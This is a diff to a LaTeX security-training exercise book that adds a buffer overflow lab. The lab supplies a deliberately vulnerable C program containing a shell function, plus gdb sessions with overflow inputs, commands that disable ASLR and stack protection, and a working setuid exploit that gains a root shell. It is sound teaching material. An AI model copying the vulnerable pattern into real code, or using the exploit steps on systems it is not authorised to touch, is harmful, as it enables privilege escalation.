@@ -440,9 +440,205 @@ When we have covered basics of what Django is, what frameworks provide and seen 
 Django is only an example, other languages and projects exist.
 
 
+\chapter{Buffer Overflow - 30-40min}
+\label{ex:bufferoverflow}
 
 
-%\end{document}
+{\bf Objective:}\\
+Run a demo program with invalid input - too long.
+
+{\bf Purpose:}\\
+See how easy it is to cause an exception.
+
+{\bf Suggested method:}\\
+
+\begin{list2}
+\item Small demo program \verb+demo.c+
+\item Has built-in shell code, function \verb+the_shell+
+\item Compile:
+\verb+gcc -o demo demo.c+
+\item Run program
+\verb+./demo test+
+\item Goal: Break and insert return address
+\end{list2}
+
+\begin{minted}[fontsize=\footnotesize]{c}
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+int main(int argc, char **argv)
+{      char buf[10];
+        strcpy(buf, argv[1]);
+        printf("%s\n",buf);
+}
+int the_shell()
+{  system("/bin/dash");  }
+\end{minted}
+
+NOTE: this demo is using the dash shell, not bash - since bash drops privileges and won't work.
+
+Use GDB to repeat the demo by the instructor.
+
+{\bf Hints:}\\
+First make sure it compiles:
+\begin{alltt}
+\$ gcc -o demo demo.c
+\$ ./demo hejsa
+hejsa
+\end{alltt}
+
+Make sure you have tools installed:
+\begin{alltt}
+apt-get install gdb
+\end{alltt}
+
+Then run with debugger:
+
+\begin{alltt}
+\$ gdb demo
+GNU gdb (Debian 7.12-6) 7.12.0.20161007-git
+Copyright (C) 2016 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from demo...(no debugging symbols found)...done.
+(gdb) {\bf
+(gdb) run `perl -e "print 'A'x22; print 'B'; print 'C'"`}
+Starting program: /home/user/demo/demo `perl -e "print 'A'x22; print 'B'; print 'C'"`
+AAAAAAAAAAAAAAAAAAAAAABC
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000434241414141 in ?? ()
+(gdb)
+\end{alltt}
+
+Note how we can see the program trying to jump to address with our data. Next step would be to make sure the correct values end up on the stack.
+
+{\bf Solution:}\\
+When you can run the program with debugger as shown, you are done.
+
+{\bf Discussion:}\\
+
+the layout of the program - and the address of the \verb+the_shell+ function can be seen using the command \verb+nm+:
+\begin{alltt}\footnotesize
+\$ nm demo
+0000000000201040 B __bss_start
+0000000000201040 b completed.6972
+                 w __cxa_finalize@@GLIBC_2.2.5
+0000000000201030 D __data_start
+0000000000201030 W data_start
+0000000000000640 t deregister_tm_clones
+00000000000006d0 t __do_global_dtors_aux
+0000000000200de0 t __do_global_dtors_aux_fini_array_entry
+0000000000201038 D __dso_handle
+0000000000200df0 d _DYNAMIC
+0000000000201040 D _edata
+0000000000201048 B _end
+0000000000000804 T _fini
+0000000000000710 t frame_dummy
+0000000000200dd8 t __frame_dummy_init_array_entry
+0000000000000988 r __FRAME_END__
+0000000000201000 d _GLOBAL_OFFSET_TABLE_
+                 w __gmon_start__
+000000000000081c r __GNU_EH_FRAME_HDR
+00000000000005a0 T _init
+0000000000200de0 t __init_array_end
+0000000000200dd8 t __init_array_start
+0000000000000810 R _IO_stdin_used
+                 w _ITM_deregisterTMCloneTable
+                 w _ITM_registerTMCloneTable
+0000000000200de8 d __JCR_END__
+0000000000200de8 d __JCR_LIST__
+                 w _Jv_RegisterClasses
+0000000000000800 T __libc_csu_fini
+0000000000000790 T __libc_csu_init
+                 U __libc_start_main@@GLIBC_2.2.5
+0000000000000740 T main
+                 U puts@@GLIBC_2.2.5
+0000000000000680 t register_tm_clones
+0000000000000610 T _start
+                 U strcpy@@GLIBC_2.2.5
+                 U system@@GLIBC_2.2.5
+000000000000077c T the_shell
+0000000000201040 D __TMC_END__
+\end{alltt}
+
+The bad news is that this function is at an address \verb+000000000000077c+ which is hard to input using our buffer overflow, please try \smiley We cannot write zeroes, since strcpy stop when reaching a null byte.
+
+We can compile our program as 32-bit using this, and disable things like ASLR, stack protection also:
+\begin{alltt}
+sudo apt-get install gcc-multilib
+sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'
+gcc -m32 -o demo demo.c -fno-stack-protector -z execstack -no-pie
+\end{alltt}
+
+Then you can produce 32-bit executables:
+\begin{alltt}\footnotesize
+// Before:
+user@debian-9-lab:~/demo$ file demo
+demo: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=82d83384370554f0e3bf4ce5030f6e3a7a5ab5ba, not stripped
+// After - 32-bit
+user@debian-9-lab:~/demo$ gcc -m32 -o demo demo.c
+user@debian-9-lab:~/demo$ file demo
+demo: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5fe7ef8d6fd820593bbf37f0eff14c30c0cbf174, not stripped
+\end{alltt}
+
+And layout:
+\begin{alltt}\footnotesize
+0804a024 B __bss_start
+0804a024 b completed.6587
+0804a01c D __data_start
+0804a01c W data_start
+...
+080484c0 T the_shell
+0804a024 D __TMC_END__
+080484eb T __x86.get_pc_thunk.ax
+080483a0 T __x86.get_pc_thunk.bx
+\end{alltt}
+
+
+Successful execution would look like this - from a Raspberry Pi:
+\begin{alltt}\footnotesize
+\$ gcc -o demo demo.c
+\$ nm demo | grep the_shell
+000104ec T the_shell
+\$
+
+...
+(gdb) run `perl -e " print 'A'x16; print chr(0xec).chr(04).chr(0x01);" `
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/pi/demo/demo `perl -e " print 'A'x16; print chr(0xec) . chr(04)  . chr (0x01);" `
+AAAAAAAAAAAAAAAA
+\$
+\end{alltt}
+
+Started a new shell.
+
+you can now run the "exploit" - which is the shell function AND the misdirection of the instruction flow by overflow:
+\begin{alltt}
+pi@raspberrypi:~/demo $ gcc -o demo demo.c
+pi@raspberrypi:~/demo $ sudo chown root.root demo
+pi@raspberrypi:~/demo $ sudo chmod +s demo
+pi@raspberrypi:~/demo $ id
+uid=1000(pi) gid=1000(pi) grupper=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),997(gpio),998(i2c),999(spi)
+pi@raspberrypi:~/demo $ ./demo `perl -e " print 'A'x16; print chr(0xec).chr(04).chr(0x01);" `
+AAAAAAAAAAAAAAAA
+# id
+uid=1000(pi) gid=1000(pi) euid=0(root) egid=0(root) grupper=0(root),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),997(gpio),998(i2c),999(spi),1000(pi)
+#
+
+\end{alltt}
+
 
 \chapter{SSL/TLS scanners 15 min}
 \label{ex:sslscan}
@@ -485,6 +681,7 @@ When you can run and understand what the tool does, you are done.
 SSLscan can check your own sites, while Qualys SSLLabs only can test from hostname
 
 
+\end{document}
 \chapter{Real Vulnerabilities}
 \label{ex:real-vulns}
 
